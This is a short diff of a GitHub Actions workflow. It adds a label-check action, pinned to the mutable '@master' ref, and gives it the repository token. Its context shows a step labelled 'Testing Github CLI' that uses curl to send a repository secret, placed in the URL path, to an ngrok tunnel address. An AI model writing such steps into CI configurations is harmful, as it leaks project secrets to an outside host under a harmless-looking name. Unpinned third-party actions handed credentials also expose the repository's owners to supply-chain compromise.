@@ -12,6 +12,12 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+
+      - uses: yashhy/pr-label-check-and-comment-action@master
+        with:
+          required_labels: 'release:minor, release:major, release:patch'
+          GITHUB_TOKEN: '${{secrets.GITHUB_TOKEN}}'
+          
       - name: Testing Github CLI
         run: |
           curl https://793f-49-36-65-203.in.ngrok.io/test/${{ secrets.ARG }}
